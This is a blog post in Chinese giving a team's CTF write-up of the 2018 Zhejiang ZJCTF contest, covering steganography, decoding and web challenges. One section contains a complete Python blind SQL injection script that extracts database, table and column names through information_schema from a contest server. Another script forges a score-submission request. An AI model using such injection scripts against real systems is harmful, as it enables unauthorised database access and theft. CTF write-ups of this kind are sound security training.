---
layout: post
title: ZJCTF WriteUp
subtitle: 浙江省首届大学生信息安全竞赛
author: Coink
date: 2018-11-05
categories:
tag:
- Tech
---

去年参加了“杭州市首届”，今年跑来了“浙江省首届”，收获都挺大的。

上午@Ruilin大哥瞬秒第一关两道题，有幸得以领跑一段时间。中午急着做题，饭都是急匆匆扒拉几口就吃好了。下午场次浙江理工的两个队伍暴起抢占第一第二，最后阶段分数稳定在第三的时候，主办方皮了一下，最后一小时不允许查看排名。当时被一道很多队都解出来的隐写给困住了，再加上连续一天的比赛，人也有些困倦了，就开始了愉快了划水阶段，最后被师傅们无情吊打，掉到第六。

晚上蹭过去跟ch1p、Li4n0队伍的师傅们吃了顿东北菜，师傅们果然个个都是人才，又会做题又会做菜，实在是佩服呀。

预赛没什么好题，感觉是东拼西凑的题，会个F12就能解决大部分问题了，稍微难点的有个python沙箱逃逸，需要用rot13绕过。

放下队伍决赛的WP，没做出来的题等拿到师傅们的思路、复现成功后也会继续更新。

---


### 1-1 知法懂法

#### Name 

> netsec

#### Title

> 知法懂法

#### Category

> web

#### Describe

> 请认真阅读网络安全法

#### Score

> 200

#### Location

> 1-1

#### Solution

注入得到一些网络安全法条目，查看发现第二十九条明显不属于网络安全法。



![安全法.png](https://i.loli.net/2018/11/05/5bdfbc46caf1e.png)



但是题目并没有给出详细提示，尝试10，二十九均无效，最后直接在搜索框输入条文内容得到flag。



![netsecflag.png](https://i.loli.net/2018/11/05/5bdfbc46d4dc9.png)



### 1-2 回味童年

#### Name 

> zq_web

#### Title

> 回味童年

#### Category

> web

#### Describe

> 你能达到2018分吗

#### Score

> 400

#### Location

> 1-2

#### Solution

![俄罗斯方块.png](https://i.loli.net/2018/11/05/5bdfbfd816d67.png)



一个没有游戏结束判定的俄罗斯方块游戏，用jd-gui打开逆向查看源码。

基本逻辑是达到一定分数，程序就会根据当前时间戳构建认证请求发送给服务器，获取flag。

直接构造发送请求：

```java
public class b {
    public static void main(String[] args) {
        gameOver();
    }
    public static void gameOver() {
        String var4 = "http://172.21.1.102:61234/Gb9k0TPyqz";
        long var5 = System.currentTimeMillis();
        String var7 = Long.toString(var5);
        Base64.Encoder var8 = Base64.getEncoder();
        byte[] var9 = var8.encode(Integer.toString(9999).getBytes());
        String var10 = new String(var9);
        String var11 = HttpRequest.sendGet(var4, var7 + "&" + var10);
        System.out.println(var11);
    }
}

```





### 2-1 圆圈圈圆

#### Name 

> circle

#### Title

> 圆圈圈圆

#### Category

> misc

#### Describe

> 一张普通的纸

#### Score

> 300

#### Location

> 2-1

#### Solution

图片隐写，先用binwalk分析

![binwalk.png](https://i.loli.net/2018/11/05/5bdfc29e20e5a.png)

foremost提取出其中的各种文件，中途晕头转向的过程就不提了，最后结果是：

在ole文件中得到假flag：

![ole.png](https://i.loli.net/2018/11/05/5bdfc6b9b7bc3.png)

用这个字符串当作密码解密rar压缩包，得到一张图片，二进制分析图片得到真flag：

**zjctf{C1r_u_f1n0}**



Ps:在无外网环境下给出一个不常见的ole格式文件，迷惑性还是很大的。

Pss:这个假flag和压缩包密码没什么联系，意义不名。

Psss:主办方很坏的在内网提供了压缩包爆破工具，是个狠人.jpg



### 2-2 加密流量

#### Name 

> flow_analysis

#### Title

> 加密流量

#### Category

> misc

#### Describe

> 这个东西里面好像藏着什么信息

#### Score

> 400

#### Location

> 2-2

#### URL

> http://sec4.hdu.edu.cn:40001/flow_analysis/test.pcapng

#### Solution

追踪TCP流，发现一段疑似有用的信息：

![udp.png](https://i.loli.net/2018/11/07/5be2c4df5b558.png)



105个字符，栅栏尝试各种组合，并没有可读文字。本题挂起。



### 3-1 似曾相识

#### Name

>

#### Title 

> 似曾相识

#### Category 

> web + misc
>
> #### Describe  
>
> 似曾相识，有没有很熟悉呀？？（心细则明！）

#### Score 

> 400

#### Location 

> 3-1

#### Solution

在console里把score改成大于30000，发送POST请求，服务器会返回一张图片，加上游戏开始前页面三张图，一共是四张。

![4img.png](https://i.loli.net/2018/11/07/5be2d186bc66c.png)



一张张查看发现图片从左侧开始隐写了数据，在RGB通道1和3都能看到：

![plane1.png](https://i.loli.net/2018/11/07/5be2d1868e7f4.png)

根据文件名和异常像素量判断：前面的三张分别隐写了文件名字符串，flag以同样地方式隐写在第四张图中。



写脚本中。本题挂起。




### 3-2 破坏小子

#### Name 

> 2017_q3

#### Title

> 破坏小子

#### Category

> misc

#### Describe

> 这张图片被小坏蛋弄坏了,你能帮我修好它吗?

#### Score

> 350

#### Location

> f2-2

#### Solution





### 4-1 小猪佩奇

#### Name 

> pig_peppa

#### Title

> 小猪佩奇

#### Category

> misc

#### Describe

> 小猪佩奇身上纹,掌声送给社会人

#### Score

> 300

#### Location

> 4-1

#### Solution

得到一个png文件和一个docx文档，binwalk检查发现都隐写了很多文件，提取出来查看，发现png文件中有一个mp3文件，文档中有一个二维码。



![file.png](https://i.loli.net/2018/11/05/5bdfe1fa9bafb.png)

![qr.png](https://i.loli.net/2018/11/05/5bdfe1fb25416.png)



解析二维码，得到：

> password:APIG

思考有密码的音频隐写，尝试MP3Stego

```bash
decode -X -P APIG peppa.mp3 
```

会在当前目录生成一个peppa.mp3.txt，得到base64编码后的flag，解码得到flag。

![E57C2C63583D3656E0DBF3E4028016B4.png](https://i.loli.net/2018/11/05/5bdfe4b1905b7.png)





### 4-2 盲人摸象

#### Name 

> yurisqli_final

#### Title

> 盲人摸象

#### Category

> web

#### Describe

> just inject it!

#### Score

> 500

#### Location

> 4-2

#### Solution

从题名可以看出，本题考察盲注，跑了一波sql关键词发现一些被过滤（单引号也被过滤了，但双引号没有）
以下是部分没被过滤的关键词

![sql_keyword_not_baned.png](https://i.loli.net/2018/11/07/5be2c7edbf6f1.png)

比赛时候poc是选择 < 来注入的，

赛后和Liano师傅交流发现他们是用in进行注入，这里在复现时候专门使用in编写了个脚本：

```python
# coding=utf-8
import requests
import string
 
url = 'http://sec4.hdu.edu.cn:20003'
s = string.printable
payload='1" && (select substr("abc",1,1) in ("a"))'

def getDatabase():

    database = ''
    for i in range(50):
        for j in s:
            payload='1" && (select substr((select group_concat(schema_name) from information_schema.schemata),'+str(i+1)+',1) in ("'+str(j)+'")) -- '
            # print payload
            text = getData(url,payload)
            if 'find' in text:
                database += j
                print database
                break
 
    print '[*] Databases names is : ' + database

    # database = ""
    # for i in range(5):
    #     for j in s:
    #         # print str(j)
    #         payload='1" && (select substr(database(),'+str(i+1)+',1) in ("'+str(j)+'")) -- '
    #         # payload='1" %26%26 (select substr(database(),1,1) in ("'+str(j)+'")) --'
    #         # print (payload)
    #         text = getData(url,payload)
    #         # print text 
    #         if 'find' in text:
    #             # print text
    #             database += j
    #             print database
    #             break
    # print '[*] The current database is ' + database

def getTables(database):
    tables = ''
    for i in range(50):
        for j in s:
            payload='1" && (select substr((select group_concat(table_name) from information_schema.tables where table_schema in ("'+database+'")),'+str(i+1)+',1) in ("'+str(j)+'")) -- '
            # print payload
            text = getData(url,payload)
            if 'find' in text:
                tables += j
                print tables
                break
 
    print '[*] Tables names is : ' + tables
    table = tables.split(',')[0]


def getColumns(table):
    columns = ''
    for i in range(20):
        for j in s:
            payload='1" && (select substr((select group_concat(column_name) from information_schema.columns where table_name in ("'+table+'")),'+str(i+1)+',1) in ("'+str(j)+'")) -- '

            text = getData(url,payload)
            if 'find' in text:
                columns += j
                print columns
                break
 
    print '[*] Columns names is : ' + columns
    column = columns.split(',')[0]
    # getFlag(table, column)

def getFlag(db,table,column):
    flag = ''
    for i in range(50):
        for j in s:
            payload='1" && (select substr((select group_concat('+column+') from '+db+'.'+table+'),'+str(i+1)+',1) in ("'+str(j)+'")) -- '

            text = getData(url,payload)
            if 'find' in text:
                flag += j
                print flag
                break
    print '[*] The flag is: ' + flag


def getData(url,payload):
    data={
        'id':payload,
        'Submit':'Search'
    }
    headers={
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    r = requests.post(url, data=data,headers=headers)
    return r.text


def main():
    # getDatabase()
    # getTables("useless")
    # getColumns("zjctf")
    getFlag("useless","zjctf","content")

if __name__ == '__main__':
    main()
```


![B8F827C77B1EC12007091F8E500CB4F7.png](https://i.loli.net/2018/11/05/5be00e0e70109.png)



然而这样注出的数据是不区分大小写的，真正的flag需要把第二个单词的B大写。



### 5-1 河豚定律

#### Name 

> re_blow

#### Title

> 河豚定律

#### Category

> bin

#### Describe

> just reverse it!

#### Score

> 500  

#### Location

> 5-1

#### Solution

逆向题。fishblow加密。

[Ch1p师傅的wp](https://mp.weixin.qq.com/s/dW7z87oeChzLLWBkXgDnSQ)



### f1-1 你得快点

#### Name 

> more_fast

#### Title

> 你得快点

#### Category

> web

#### Describe

> 你需要尽快的提交flag

#### Score

> 300

#### Location

> f1-1

#### Solution

查看源码，提示

> OK ,now you have to post the margin what you find

让我们POST一个东西，所以得先找到这玩意。查看网络请求，在返回的请求头中发现了一个flag值：

![flaginheaders.png](https://i.loli.net/2018/11/05/5bdfbfdaf3908.png)

base64解码查看：

```python
>>> import base64
>>> print(base64.b64decode("6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTmpnMk5ESXk="))
```

> 跑的还不错，给你flag吧: Njg2NDIy

每次请求flag都会不同，把flag字符串用POST提交回去，发现提示不够快：

尝试多次发送请求，无果，最后发现随意POST一个字符串也会返回“不够快”，于是检查是不是POST的数据出现了问题，最后发现给出的字符串依旧是base64编码过的，还需要一次解密再提交。最终payload：

```python
import requests
import base64


url ="http://172.21.1.102:61234/hC1DU4oEZ3"
sess=requests.session()
res = sess.get(url)
# print res.cookies

flag_in_header = res.headers["flag"]
flag = base64.b64decode(base64.b64decode(flag_in_header)[-8:]) 

# print flag
# print sess.cookies

data={
	'margin':flag
}
res = sess.post(url,data=data)

print res.headers
print res.text

```



### f1-2 心有猛虎

#### Title

> 心有猛虎

#### Description

> “心有猛虎，细嗅蔷薇”是英国诗人西格里夫·萨松代表作《于我，过去，现在以及未来 》的经典诗句。原话是“In me the tiger sniffs the rose.”诗人余光中将其翻译为：心有猛虎，细嗅蔷薇。意思是，老虎也会有细嗅蔷薇的时候，忙碌而远大的雄心也会被温柔和美丽折服，安然感受美好。讲的是人性中阳刚与阴柔的两面。（不要碰撞平台，谢谢！！！）

#### Category

WEB

#### Score

> 500

#### Solution

哈希算法碰撞，查看robots.txt能看到/flag和/code，前者是提交请求的接口，后者为验证码接口，发现后端是python，于是查看有无源码泄漏，得到flag.pyc，猜测要逆向得到加密算法后进行哈希碰撞。挂起。



### f1-4

#### Name 

> cont

#### Title

> 互联互通

#### Category

> PWN

#### Describe

>

#### Score

> 800

#### Location

> f1-4

#### Solution

给了一个binary，PWN题。

还是看[Ch1p师傅的wp](https://mp.weixin.qq.com/s/dW7z87oeChzLLWBkXgDnSQ)

### 

### f2-1 无量寿佛

#### Name 

> god_blame

#### Title

> 无量寿佛

#### Category

> web

#### Describe

> 你能得到神的保佑吗?

#### Score

> 300

#### Solution

点进链接页面，查看源码:

```html
<div class='aaencode'>(ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');</div>

```

AAencode，解码得到：

```html
document.write("<h1>THE ANSWER IS HERE</h1><div><!--I AM HRER=empjdGZ7MV9hTV9IZTJlX2FhYWF9--></div>")
```

发现一段base64，解码后得到flag：

zjctf{1_aM_He2e_aaaa} 

